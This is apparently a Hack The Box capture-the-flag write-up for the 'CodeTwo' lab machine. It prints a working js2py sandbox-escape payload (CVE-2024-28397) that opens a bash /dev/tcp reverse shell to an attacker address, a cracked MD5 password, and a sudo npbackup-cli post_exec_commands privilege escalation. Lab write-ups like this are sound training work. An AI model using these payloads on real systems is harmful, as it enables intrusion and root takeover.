---
layout: post
title:  "Hack The Box CodeTWO Write-up"
category : 
tags :  hackthebox ctf js2py cve-2024-28397 flask sqlite md5 npbackup privilege-escalation
---

Machine Author(s): FisMatHack

# CodeTwo - HackTheBox

**IP:** `10.10.11.82`  
**Difficulty:** easy  
**OS:** Linux  


---

## Reconnaissance

### Nmap
```bash
nmap -sC -sV -oN nmap.txt 10.10.11.82
```

**Open Port:** 8000 (Python Console)

## Web Enumeration

### Port 8000 - Python Console Application
- Flask application available at `http://10.10.11.82:8000`
- Application download functionality (`/download`)
- Downloaded `app.zip` containing source code

## Source Code Analysis

### Application Structure
```
app/
├── app.py (main code)
├── users.db (SQLite database)
├── static/
└── templates/
```

### Vulnerabilities Identified in app.py

#### 1. **Weak MD5 Hashing**
```python
password_hash = hashlib.md5(password.encode()).hexdigest()
```

#### 2. **Server-side JavaScript Execution**
```python
@app.route('/run_code', methods=['POST'])
def run_code():
    try:
        code = request.json.get('code')
        result = js2py.eval_js(code)  # ⚠️ RCE via js2py
        return jsonify({'result': result})
    except Exception as e:
        return jsonify({'error': str(e)})
```

**Insufficient Protection:**
```python
js2py.disable_pyimport()  # Bypassable
```

## Exploitation

### CVE-2024-28397 - js2py Sandbox Escape

**Reference:** https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape

#### Exploitation Technique
1. Access Python's type system via JavaScript
2. `Object.getOwnPropertyNames({}).__getattribute__`
3. Navigate to `__class__.__base__` (Python base object)
4. Enumerate `object.__subclasses__()`
5. Find `subprocess.Popen`
6. Execute system commands

### Reverse Shell Payload

```javascript
var hacked = Object.getOwnPropertyNames({});
var bymarve = hacked.__getattribute__;
var n11 = bymarve("__getattribute__");
var obj = n11("__class__").__base__;

function findPopen(o) {
    var subs = o.__subclasses__();
    for (var i in subs) {
        try {
            var item = subs[i];
            if (item && item.__module__ && item.__name__) {
                if (item.__module__ == "subprocess" && item.__name__ == "Popen") {
                    return item;
                }
            }
            if (item && item.__name__ != "type") {
                var result = findPopen(item);
                if (result) return result;
            }
        } catch(e) {
            continue;
        }
    }
    return null;
}

var Popen = findPopen(obj);
if (Popen) {
    var cmd = "bash -c 'exec 5<>/dev/tcp/10.10.16.X/4444;cat <&5 | while read line; do $line 2>&5 >&5; done'";
    var out = Popen(cmd, -1, null, -1, -1, -1, null, null, true).communicate();
    console.log(out);
} else {
    console.log("Popen not found");
}
```

### Exploitation Steps
1. **Setup Listener:** `nc -lvnp 4444`
2. **Register** on the web application
3. **Login** to dashboard
4. **Execute** JavaScript payload
5. **Shell obtained** as `app` user

## User Access

### Database Extraction
```bash
cd /home/app/app/instance
cat users.db
```

**Found Data:**
- **Username:** `marco`
- **MD5 Hash:** `649c9d65a206a75f5abe509fe128bce5`

### Hash Cracking
**Tool:** https://crackstation.net/  
**Password:** `sweetangelbabylove`

### SSH Connection
```bash
ssh marco@10.10.11.82
cat /home/marco/user.txt
```

**User Flag obtained** 🚩

## Privilege Escalation

### Privilege Enumeration
```bash
sudo -l
```

**Result:**
```
User marco may run the following commands on codetwo:
    (root) NOPASSWD: /usr/local/bin/npbackup-cli
```

### npbackup-cli Analysis

#### Existing Configuration
`npbackup.conf` file present in `/home/marco/`

#### Initial Test
```bash
sudo /usr/local/bin/npbackup-cli -c npbackup.conf -b --force
```

**Error:** Backup smaller than configured minimum backup size

### Exploitation via Malicious Configuration

#### Creating Modified Configuration File
```bash
cp npbackup.conf npbackupp.conf
```

**Configuration File Modification:**
```yaml
backup_opts:
  paths:
    - /root  # Changed source path
  source_type: folder_list
  post_exec_commands:
    - "cp /root/root.txt /home/marco/root.txt"
    - "chmod 777 /home/marco/root.txt"
```

#### Execution
```bash
sudo /usr/local/bin/npbackup-cli -c npbackupp.conf -b --force
```

#### Flag Retrieval
```bash
cat /home/marco/root.txt
```

**Root Flag obtained** 🏁

---

## Summary

1. **Reconnaissance:** Flask application on port 8000
2. **Analysis:** js2py vulnerability (CVE-2024-28397) + weak MD5 hashing
3. **Exploitation:** RCE via JavaScript sandbox escape
4. **User:** MD5 hash cracking for SSH access
5. **Root:** npbackup-cli exploitation with malicious configuration

## Key Vulnerabilities
- **CVE-2024-28397:** js2py Sandbox Escape
- **Weak Hashing:** Easily crackable MD5
- **Sudo Configuration:** npbackup-cli with post_exec_commands

